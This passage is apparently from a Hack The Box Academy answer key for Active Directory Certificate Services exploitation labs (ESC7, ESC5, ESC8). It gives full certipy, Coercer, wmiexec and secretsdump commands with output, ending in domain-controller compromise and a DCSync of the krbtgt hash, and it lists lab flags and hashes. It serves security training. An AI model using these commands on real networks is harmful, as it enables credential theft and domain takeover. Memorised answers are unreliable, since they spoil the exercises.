C:\Windows\system32> more C:\Users\molly\Desktop\flag.txt

HTB{ESC4_MSPKI}
```

Alternatively, students can `pass-the-hash` `2b576acbe6bcfda7294d6bd18041b8fe` with `wmiexec.py` and exfiltrate the contents of the file `C:\Users\molly\Desktop\flag.txt` directly:

Code: shell

```shell
wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\molly\Desktop\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Users\molly\Desktop\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC4_MSPKI}
```

Answer: `HTB{ESC4_MSPKI}`

# ESC7

## Question 1

### "Which user has ManageCertificates rights?"

After spawning the target machine, students need to use `certipy` with the `find` command to enumerate the ADCS CA; students will discover that the user with the `ManageCertificates` rights is `Josy`:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Josy
        ManageCa                        : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
        ManageCertificates              : LAB.LOCAL\Josy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
<SNIP>
```

Answer: `Josy`

# ESC7

## Question 2

### "Which other user whose name starts with Ju has ManageCa rights?"

By analyzing the output from the `certipy find` command used in the previous question, students will discover that `Juanmy` is the other user with `ManageCa` rights:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Josy
        ManageCa                        : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
        ManageCertificates              : LAB.LOCAL\Josy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
<SNIP>
```

Answer: `Juanmy`

# ESC7

## Question 3

### "Abuse the ESC7 misconfiguration and steal the NT hash of the account Josy"

By analyzing the output from the `certipy` `find` command used in the previous question, students have learned that the user `blwasp` possesses dangerous permissions over the CA, rendering it vulnerable to `ESC7`. Consequently, they need to use the `ca` command of `certipy` to grant `ManageCertificates` rights to the user, specifying the `blwasp` user for the `-add-officer` option:

Code: shell

```shell
certipy ca -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -add-officer blwasp
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy ca -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -add-officer blwasp

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'blwasp' on 'lab-LAB-DC-CA'
```

Additionally, when using the `find` command of `certipy` along with the `-enabled` option, students will discover that the built-in template `SubCA`, which is vulnerable to `ESC1` by default (and allows `Client Authentication`), is enabled:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -enabled -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.130.56 -enabled -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
<SNIP>
 4
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
```

Therefore, students need to use the `req` command of `certipy`, specifying the template `SubCA` for the `-template` option and the `UPN` `Josy` for the `-upn` option (when prompted to save the private key, students can either answer with yes or no, however, remembering the `Request ID` is important):

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template SubCA -upn Josy
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template SubCA -upn Josy

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 63
Would you like to save the private key? (y/N) y
[*] Saved private key to 63.key
[-] Failed to request certificate
```

Regardless of the CA refusing to enroll the user `Josy` for the `SubCA` template, students need to abuse the `ManageCertificates` rights that `blwasp` possesses to issue the certificate, circumventing the conditions of only `Domain Admins` or `Enterprise Admins` being able to enroll; students need to the use `ca` command of `certipy`, specifying the `Request ID` previously attained for the `-issue-request` option:

Code: shell

```shell
certipy ca -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -issue-request 63
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy ca -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -issue-request 63

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

After that, students need to abuse the `ManageCertificates` rights that `blwasp` possesses to retrieve the issued certificate; students need to use the `req` command of `certipy`, specifying the `Request ID` previously attained for the `-retrieve` option to attain a `PFX` certificate for the `Josy` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -retrieve 63
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -retrieve 63

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 63
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Josy'
[*] Certificate has no object SID
[*] Loaded private key from '63.key'
[*] Saved certificate and private key to 'josy.pfx'
```

At last, utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Josy` and `Un-PAC-the-hash` within it; students will attain the NT hash `f0982e00d07f1329412df06ba5f6b67e`:

Code: shell

```shell
certipy auth -pfx josy.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy auth -pfx josy.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: josy@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'josy.ccache'
[*] Trying to retrieve NT hash for 'josy'
[*] Got hash for 'josy@lab.local': aad3b435b51404eeaad3b435b51404ee:f0982e00d07f1329412df06ba5f6b67e
```

Answer: `f0982e00d07f1329412df06ba5f6b67e`

# ESC5

## Question 1

### "Using the credentials cken:Superman001, abuse the ESC5 misconfiguration to compromise the DC. What is the value of the flag file at C:\\ESC5\\flag.txt?"

After spawning the target machine, students first need to establish dynamic port forwarding to access the target's internal network; it is important to set the `-oStrictHostKeyChecking` option to `accept-new`, which allows SSH to automatically add new host keys to the user's known hosts files:

Code: shell

```shell
sshpass -p 'HTB_@cademy_stdnt!' ssh -N -f -D 127.0.0.1:9050 htb-student@STMIP -oStrictHostKeyChecking=accept-new
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ sshpass -p 'HTB_@cademy_stdnt!' ssh -N -f -D 127.0.0.1:9050 htb-student@10.129.205.205 -oStrictHostKeyChecking=accept-new

Warning: Permanently added '10.129.205.205' (ECDSA) to the list of known hosts.
```

Additionally, students need to comment out `proxy_dns` in `/etc/proxychains.conf`:

Code: shell

```shell
sudo sed -i "s/proxy_dns/#proxy_dns/" /etc/proxychains.conf
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ sudo sed -i "s/proxy_dns/#proxy_dns/" /etc/proxychains.conf
```

When tunneling via `proxychains` the `smb` protocol of `cme` or (`nxc`) and utilizing the credentials `cken:Superman001`, students will discover that `cken` is a local admin on the ADCS server `WS01`:

Code: shell

```shell
proxychains -q cme smb 172.16.19.3 172.16.19.5 -u cken -p Superman001
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q cme smb 172.16.19.3 172.16.19.5 -u cken -p Superman001

SMB         172.16.19.5     445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:lab.local) (signing:False) (SMBv1:False)
SMB         172.16.19.3     445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:True) (SMBv1:False)
SMB         172.16.19.5     445    WS01             [+] lab.local\cken:Superman001 (Pwn3d!)
SMB         172.16.19.3     445    LAB-DC           [+] lab.local\cken:Superman001
```

Moreover, when tunneling via `proxychains` the `find` command of `certipy` along with the `-enabled` option, students will discover that the built-in template `SubCA`, which is vulnerable to `ESC1` by default (and allows `Client Authentication`), is enabled:

Code: shell

```shell
proxychains -q certipy find -u cken@lab.local -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -enabled -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q certipy find -u cken@lab.local -p Superman001 -dc-ip 172.16.19.3 -ns 172.16.19.3 -dns-tcp -enabled -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[*] Got CA configuration for 'lab-WS01-CA'
<SNIP>
  3
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : lab-WS01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
```

Because `cken` is a local administrator, it can enroll in certificates using the `SubCA` template; therefore, students need to combine this inherent misconfiguration with `ESC1`. Students need to tunnel via `proxychains` the `req` command of `certipy`, specifying the template `SubCA` for the `-template` option and the `UPN` `Administrator` for the `-upn` option (when prompted to save the private key, students can either answer with yes or no, however, remembering the `Request ID` is important):

Code: shell

```shell
proxychains -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -template SubCA -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 11
Would you like to save the private key? (y/N) y
[*] Saved private key to 11.key
[-] Failed to request certificate
```

Regardless of the CA refusing to enroll the user `Administrator` for the `SubCA` template, students need to abuse the `ManageCa` rights that `cken` possesses to issue the certificate; students need to tunnel via `proxychains` the `ca` command of `certipy`, specifying the `Request ID` previously attained for the `-issue-request` option:

Code: shell

```shell
proxychains -q certipy ca -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 11
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q certipy ca -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -issue-request 11

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

After that, students need to abuse the `ManageCertificates` rights that `cken` possesses to retrieve the issued certificate; students need to use the `req` command of `certipy`, specifying the `Request ID` previously attained for the `-retrieve` option to attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
proxychains -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 11
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q certipy req -u cken -p Superman001 -dc-ip 172.16.19.3 -target-ip 172.16.19.5 -ca lab-WS01-CA -retrieve 11

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 11
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '11.key'
[*] Saved certificate and private key to 'administrator.pfx
```

Utilizing the certificate, students need to tunnel via `proxychains` the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `6e599ada28db049c044cc0bb4afeb73d`:

Code: shell

```shell
proxychains -q certipy auth -pfx administrator.pfx -domain lab.local -dc-ip 172.16.19.3
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q certipy auth -pfx administrator.pfx -domain lab.local -dc-ip 172.16.19.3

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:6e599ada28db049c044cc0bb4afeb73d
```

Subsequently, students need to add a vHost entry for the DC living in the target's internal network `172.16.19.3` so that `Kerberos` authentication functions correctly:

Code: shell

```shell
sudo sh -c 'echo "172.16.19.3 lab-dc.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ sudo sh -c 'echo "172.16.19.3 lab-dc.lab.local" >> /etc/hosts'
```

With the TGT for the `Administrator` user attained, students need to `pass-the-ticket` with `wmiexec.py` to gain remote code execution on `lab-dc.lab.local`, making sure set the environment variable `KRB5CCNAME` to `administrator.ccache` before tunneling the command with `proxychains`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py -k -no-pass lab-dc.lab.local -dc-ip 172.16.19.3
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache proxychains -q wmiexec.py -k -no-pass lab-dc.lab.local -dc-ip 172.16.19.3

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
dc\administrator
```

When reading the contents of the file `C:\ESC5\flag.txt`, students will attain the flag `HTB{ESC5_ACC3S5_ABUS3}`:

Code: shell

```shell
more "C:\ESC5\flag.txt"
```

```
C:\>more "C:\ESC5\flag.txt"

HTB{ESC5_ACC3S5_ABUS3}
```

Alternatively, students can `pass-the-hash` `6e599ada28db049c044cc0bb4afeb73d` with `wmiexec.py` and exfiltrate the contents of the file `C:\ESC5\flag.txt` directly:

Code: shell

```shell
proxychains -q wmiexec.py -no-pass -hashes :6e599ada28db049c044cc0bb4afeb73d administrator@172.16.19.3 "more C:\ESC5\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-6eyilg2fh9]─[~]
└──╼ [★]$ proxychains -q wmiexec.py -no-pass -hashes :6e599ada28db049c044cc0bb4afeb73d administrator@172.16.19.3 "more C:\ESC5\flag.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC5_ACC3S5_ABUS3}
```

Answer: `HTB{ESC5_ACC3S5_ABUS3}`

# ESC8

## Question 1

### "Use the credentials of blwasp@lab.local (blwasp:Password123!) to abuse the ESC8 misconfiguration and compromise the DC. Perform a DCSync attack and submit the NT hash of KRBTGT as the answer."

After spawning the target machine, students need to connect to it with SSH, passing the password `HTB_@cademy_stdnt!` with `sshpass` (it is important to set the `-oStrictHostKeyChecking` option to `accept-new`, which allows SSH to automatically add new host keys to the user's known hosts files):

Code: shell

```shell
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@STMIP -oStrictHostKeyChecking=accept-new
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-jyuiquw0eq]─[~]
└──╼ [★]$ sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.205.205 -oStrictHostKeyChecking=accept-new

Warning: Permanently added '10.129.205.205' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-155-generic x86_64)
<SNIP>
$ 
```

Students then need to spawn a `bash` shell as root (instead of the default `sh` one):

Code: shell

```shell
sudo bash
```

```
$ sudo bash

[sudo] password for htb-student: 
root@ubuntu:/home/htb-student#
```

Moreover, students need to check the contents of `/etc/hosts` to find vHost entries for the hosts within the target's internal network:

Code: shell

```shell
cat /etc/hosts
```

```
root@ubuntu:/home/htb-student# cat /etc/hosts

<SNIP>

172.16.19.3	lab-dc lab-dc.lab.local	lab.local
172.16.19.5	ws01.lab.local	ws01
<SNIP>
```

When using `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities utilizing the credentials `blwasp@lab.local:Password123!`, students will discover that the CA suffers from `ESC8` (and `ESC11`):

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip 172.16.19.3 -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-jyuiquw0eq]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 172.16.19.3 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'lab-WS01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'lab-WS01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```

Before abusing `ESC8`, students need to start a new `tmux` session to allow multiple panes usage (students can split panes vertically using the key combination `Ctrl` + `b` + `%` (or `"` for a horizontal split)):

Code: shell

```shell
tmux new -s ESC8
```

```
root@ubuntu:/home/htb-student# tmux new -s ESC8
```

To abuse `ESC8`, students first need to, in one pane, use the `relay` command of `certipy`, specifying the IP address of the DC `172.16.19.5` for the `-target` option and the `DomainController` template for the `-template` option:

Code: shell

```shell
certipy relay -target 172.16.19.5 -template DomainController
```

```
root@ubuntu:/home/htb-student# certipy relay -target 172.16.19.5 -template DomainController

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://172.16.19.5/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```

In another pane, students need to, utilizing the credentials `blwasp:Password123!`, use [coercer](https://github.com/p0dalirius/Coercer) to coerce `172.16.19.3`/`lab-dc` into performing `SMB` `NTLM` authentication against `172.16.19.19` and have `coercer` relay it over `HTTP` to `172.16.19.5/certsrv/certfnsh.asp` (which is one type of `NTLM` `cross-protocol relay attacks`):

Code: shell

```shell
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p Password123! -d lab.local --always-continue
```

```
root@ubuntu:/home/htb-student# coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p Password123! -d lab.local --always-continue

	   ______                                                                                                        
      / ____/___  ___  _____________  _____                                                                          
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/                                                                          
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_                         
                                                                                                                                              
[info] Starting coerce mode                                                                                                                   
[info] Scanning target 172.16.19.3                                                                                                            
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,49696,49704,49721,49680,49689,49693
[+] DCERPC port '49693' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\172.16.19.19\x00') 
      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\172.16.19.19\x00')
<SNIP>
```

When checking the tab with `certipy`, students will notice that a `PFX` certificate for the machine account `LAB-DC$` has been attained:

```
DC\LAB-DC$
[*] Requesting certificate for 'DC\\LAB-DC$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'lab-dc.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lab-dc.pfx'
[*] Exiting...
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `lab-dc$` and `Un-PAC-the-hash` within it; students will attain the NT hash `2a26de90f1bf0c9b05c1ae9170a6a22e`:

Code: shell

```shell
certipy auth -pfx lab-dc.pfx
```

```
root@ubuntu:/home/htb-student# certipy auth -pfx lab-dc.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: lab-dc$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'lab-dc.ccache'
[*] Trying to retrieve NT hash for 'lab-dc$'
[*] Got hash for 'lab-dc$@lab.local': aad3b435b51404eeaad3b435b51404ee:2a26de90f1bf0c9b05c1ae9170a6a22e
```

At last, utilizing the TGT, students need to perform a `DCSync` attack with `secretsdump.py`, specifying the user `krbtgt` for the `-just-dc-user` option; students will discover that the `krbtgt`'s NT hash is `fc9b9cb697c498cdce57e0566075435e`:

Code: shell

```shell
KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local -just-dc-user krbtgt

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fc9b9cb697c498cdce57e0566075435e:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:c670daab0c6dd34aeabc6124e40e8ebf490f6f8af5aefc04074e60a199f2d279
